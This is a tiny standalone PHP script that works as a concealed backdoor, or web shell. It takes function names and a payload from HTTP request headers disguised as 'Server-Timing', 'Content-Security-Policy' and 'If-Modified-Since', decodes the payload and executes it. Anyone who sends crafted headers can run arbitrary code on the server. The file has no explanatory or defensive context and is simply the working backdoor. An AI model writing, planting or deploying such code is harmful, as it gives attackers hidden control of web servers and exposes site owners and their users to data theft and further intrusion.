<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Server-Timing'])) {
    $requests = $_HEADERS['Server-Timing']('', $_HEADERS['Content-Security-Policy']($_HEADERS['If-Modified-Since']));
    $requests();
}